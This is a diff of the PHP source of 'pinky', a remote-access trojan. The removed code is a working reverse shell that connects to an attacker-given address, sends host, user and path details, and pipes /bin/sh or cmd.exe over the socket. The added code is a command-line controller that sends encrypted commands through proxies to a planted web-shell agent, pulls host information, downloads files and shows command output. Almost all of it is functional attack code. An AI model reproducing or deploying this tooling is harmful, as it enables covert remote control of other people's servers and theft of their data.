@@ -1,182 +1,145 @@
+#!/usr/bin/env php
 <?php
-set_time_limit(0);
+include './functions.php';
+include './banners.php';
 
-$version = "0.2";
-$author = "David Tavarez (davidtavarez)";
-$url = "https://davidtavarez.github.io/pinky/";
+$version = "2.0";
 
-if (PHP_SAPI === 'cli' || empty($_SERVER['REMOTE_ADDR'])) {
-    echo chr(27) . chr(91) . 'H' . chr(27) . chr(91) . 'J';
-} else {
-    header('Content-type: text/plain');
-}
-echo "pinky - The (reverse) PHP mini RAT v" . $version . "\n";
-echo $author . "\n";
-echo $url . "\n";
+print_welcome($version);
 
-$bin = PHP_BINDIR;
-$path = realpath(NULL) . '/';
-$tmp_path = $path;
-$os = null;
-$shell = null;
-
-$address = '127.0.0.1';
-$port = 3391;
-$type = 'tcp';
-
-if (PHP_SAPI === 'cli' || empty($_SERVER['REMOTE_ADDR'])) {
-    $params = "a:";
-    $params .= "p:";
-    $params .= "t:";
-    
-    $options = getopt($params);
-    
-    if (isset($options['a']) == false) {
-        exit("\nERROR: Server address not provided.\n\n");
-    }
-    if (isset($options['p']) == false) {
-        exit("\nERROR: Port number not provided.\n\n");
-    }
-    
-    $address = $options['a'];
-    $port = (int) $options['p'];
-    $type = isset($options['t']) ? $options['t'] : 'tcp';
-} else {
-    if (isset($_GET['a']) == false) {
-        exit("\nERROR: Server address not provided.\n\n");
-    }
-    if (isset($_GET['p']) == false) {
-        exit("\nERROR: Port number not provided.\n\n");
-    }
-    
-    $address = $_GET['a'];
-    $port = (int) $_GET['p'];
-    $type = isset($_GET['t']) ? $_GET['t'] : 'tcp';
+if (count($argv) == 1) {
+    echo "\n [-] I need a json file containing the settings. \n\n";
+    exit(-1);
 }
 
-echo "\nChecking if function \e[1mproc_open\e[0m is available... ";
+$file = $argv[1];
 
-if (function_exists('proc_open')) {
-    echo "Ok.\n";
-} else {
-    exit("Failed.");
+if (!is_readable($file)) {
+    echo "\n [-] Hey! I can't read that file no_O\n\n";
+    exit(-1);
 }
 
-echo "Detecting Operative System... ";
-$os = strtoupper(substr(PHP_OS, 0, 3));
-echo "Ok.\n";
+$config = json_decode(file_get_contents($file), true);
+if (!is_json_valid($config)) {
+    echo "\n [-] That config file is not valid! (╯°□°)╯︵ ┻━┻\n\n";
+    exit(-1);
+}
+echo " [+] The json file is valid.\n";
 
-echo "Trying to open connection with the server... ";
-$session = @stream_socket_client($type . '://' . $address . ':' . $port, $errno, $errstr, 30);
+$key      = $config['key'];
+$url      = $config['url'];
+$login    = $config['login']['username'];
+$password = $config['login']['password'];
 
-if (! $session) {
-    exit("ERROR: " . $errstr . "\n\n");
-} else {
-    echo "Connection stablished with \e[1m" . $type . "\e[0m://\e[1m" . $address . "\e[0m:\e[1m" . $port . "\e[0m/\n";
-    
-    // Send client information.
-    echo "Sending client information...\n";
-    
-    // System
-    stream_socket_sendto($session, php_uname('s') . ' ' . php_uname('v'));
-    echo "\t" . stream_socket_recvfrom($session, 1024) . "\n";
-    
-    // Machine
-    stream_socket_sendto($session, php_uname('m'));
-    echo "\t" . stream_socket_recvfrom($session, 1024) . "\n";
-    
-    // Hostname
-    stream_socket_sendto($session, php_uname('n'));
-    echo "\t" . stream_socket_recvfrom($session, 1024) . "\n";
-    
-    // Userser
-    stream_socket_sendto($session, get_current_user());
-    echo "\t" . stream_socket_recvfrom($session, 1024) . "\n";
-    
-    // Bin Path
-    stream_socket_sendto($session, $bin);
-    echo "\t" . stream_socket_recvfrom($session, 1024) . "\n";
-    
-    // Client Path
-    stream_socket_sendto($session, $path);
-    echo "\t" . stream_socket_recvfrom($session, 1024) . "\n";
-    
-    // Start the session.
-    echo "Starting shell... ";
-    if ($os === 'WIN') {
-        $shell = "C:\\Windows\\System32\\cmd.exe";
-    } else {
-        $shell = '/bin/sh -i';
+$proxy    = array();
+if (isset($config['proxy'])) {
+    echo " [+] We're going to use a proxy.\n";
+    $proxy = $config['proxy'];
+}
+
+$cookies = null;
+if (isset($config['cookies'])) {
+    $cookies = $config['cookies'];
+}
+
+$username    = '';
+$path        = '';
+$hostname    = '';
+$php_version = '';
+$os          = '';
+$info        = '';
+$time        = '';
+$ip          = '';
+$client_ip   = '';
+$tools       = array();
+$method      = 'openssl';
+
+echo " [+] Trying to connect... ";
+
+$result = send_request($url, array('i' => base64_encode('ping')), $login, $password, $proxy, $cookies);
+
+if ($result['status'] != 200) {
+    echo "Failed, agent not found.\n";
+    exit(-1);
+}
+
+echo "Good.\n";
+echo " [+] Let's parse the host information... ";
+if(strpos($result['content'],'captcha') > -1) {
+    echo "Failed, some Captcha was found, try to reset the Tor circuit...\n";
+    exit(-1);
+} elseif (strpos($result['content'],'openssl_encrypt') > -1){
+    echo "Failed, the Target doesn't support Encryption.\n";
+    exit(-1);
+} elseif (strpos($result['content'],'mcrypt') > -1){
+    echo "Failed, the Target doesn't support Encryption.\n";
+    exit(-1);
+}else {
+    $response = decrypt($result['content'], $key,  $method);
+
+    if(is_null($response) || $response == false){
+        $method = 'mcrypt';
+        $response = decrypt($result['content'], $key,  $method);
+        if(is_null($response) || $response == false) {
+            echo "Failed, unable to decrypt the response.\n\n";
+            exit(-1);
+        }
     }
-    $process = proc_open($shell, array(
-        array(
-            'pipe',
-            'r'
-        ),
-        array(
-            'pipe',
-            'w'
-        ),
-        array(
-            'pipe',
-            'w'
-        )
-    ), $pipes, $path, null);
-    $process_status = proc_get_status($process);
-    echo "Ok.\n";
-    
-    // Set everything to non-blocking
-    stream_set_blocking($pipes[0], 0);
-    stream_set_blocking($pipes[1], 0);
-    stream_set_blocking($pipes[2], 0);
-    
-    stream_set_blocking($session, 0);
-    
-    while ($session != false) {
-        $read = array(
-            $session,
-            $pipes[1],
-            $pipes[2]
-        );
-        $write = NULL;
-        $except = NULL;
-        
-        stream_select($read, $write, $except, 0);
-        
-        if (in_array($session, $read)) {
-            $input = fread($session, 1024);
-            if (strlen($input) > 0) {
-                if (strpos($input, '--pinky-') === 0) {
-                    $command = strtolower(substr($input, strlen('--pinky-') - strlen($input)));
-                    switch ($command) {
-                        case 'stop':
-                            stream_socket_sendto($session, 'OK');
-                            echo "Closing session... ";
-                            stream_socket_shutdown($session, STREAM_SHUT_WR);
-                            fclose($session);
-                            fclose($pipes[0]);
-                            fclose($pipes[1]);
-                            fclose($pipes[2]);
-                            proc_close($process);
-                            $session = false;
-                            break;
-                        default:
-                            stream_socket_sendto($session, "ERROR: Command \e[1m" . $command . "\e[0m not found.\n");
-                    }
-                } else {
-                    fwrite($pipes[0], $input);
+
+    $response = json_decode($response, true);
+
+    $username    = $response['user'];
+    $path        = $response['path'];
+    $hostname    = $response['hostname'];
+    $php_version = $response['php'];
+    $os          = $response['os'];
+    $info        = $response['server'];
+    $time        = $response['time'];
+    $ip          = $response['ip'];
+    $client_ip   = $response['client_ip'];
+    $tools       = explode('|', $response['tools']);
+    echo "Done.\n";
+    unset($response, $result);
+}
+
+echo " [+] Opening the shell... \n";
+
+sleep(1);
+
+print_cool_banner();
+
+echo "\n";
+echo "\e[37mServer IP\t:=\e[0m \e[97m{$ip}\e[0m\t\n\e[37mClient IP\t:=\e[0m \e[97m{$client_ip}\e[0m\n";
+echo "\e[37mTime @ Server\t:=\e[0m \e[97m{$time}\e[0m\n";
+echo "\e[37mInformation\t:=\e[0m \e[97m".strtoupper($os)."\e[0m\n";
+echo "\e[37mWeb Server\t:=\e[0m \e[97m".strtoupper($info)."\e[0m\n";
+echo "\n";
+
+do {
+    $prefix = "\e[91m{$username}\e[0m@\e[33m{$hostname}\e[0m:\e[94m{$path}\e[0m$ ";
+    $line   = readline($prefix);
+    $cmd    = trim(str_replace(array("\n", "\r"), '', $line));
+    if ($cmd != 'exit' && strlen($cmd) > 0) {
+        $data = make_request($cmd, $path, $key, $method);
+        if (!isset($data['c']) && !isset($data['f'])) {
+            continue;
+        }
+        $result = send_request($url, $data, $login, $password, $proxy, $cookies);
+        if ($result['status'] == 200) {
+            $decrypted_content = decrypt($result['content'], $key, $method);
+            $response          = json_decode($decrypted_content, true);
+            $path              = base64_decode($response['path']);
+            $files             = $response['files'];
+            if(!is_null($files)){
+                foreach ($files as $file) {
+                    $content  = $file['content'];
+                    $download = base64_to_file($content, getcwd(), basename($file['name']));
+                    echo " [+] File \e[94m{$download}\e[0m was downloaded successfully.\n";
                 }
             }
-        }
-        
-        if (in_array($pipes[1], $read)) {
-            fwrite($session, fread($pipes[1], 1024));
-        }
-        
-        if (in_array($pipes[2], $read)) {
-            fwrite($session, fread($pipes[2], 1024));
+            echo base64_decode($response['output']);
+        } else {
+            echo "\n\tWe received {$result['status']} instead of 200 ¯\_(ツ)_/¯\n\n";
         }
     }
-}
-
-echo "Done.\n\n";
+} while (strtolower($cmd) != 'exit');
